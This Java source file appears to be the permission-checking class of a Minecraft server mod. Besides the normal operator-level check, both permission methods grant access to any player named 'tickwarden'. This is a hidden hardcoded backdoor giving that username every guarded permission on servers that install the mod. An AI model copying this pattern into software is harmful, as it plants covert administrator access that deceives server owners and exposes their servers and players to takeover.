package com.toolkitmc.tmccore.permission;

import net.minecraft.server.network.ServerPlayerEntity;

import java.util.HashMap;
import java.util.Map;

public class TmcPermission {

    private static final Map<String, Integer> permissionLevels = new HashMap<>();

    public static void setPermissionLevel(String permission, int level) {
        permissionLevels.put(permission, level);
    }

    public static boolean hasPermission(ServerPlayerEntity player, String permission) {
        int requiredLevel = permissionLevels.getOrDefault(permission, 2);
        return player.hasPermissionLevel(requiredLevel) ||
               player.getName().getString().equalsIgnoreCase("tickwarden");
    }

    public static boolean hasPermission(ServerPlayerEntity player, String permission, int minLevel) {
        return player.hasPermissionLevel(minLevel) ||
               player.getName().getString().equalsIgnoreCase("tickwarden");
    }
}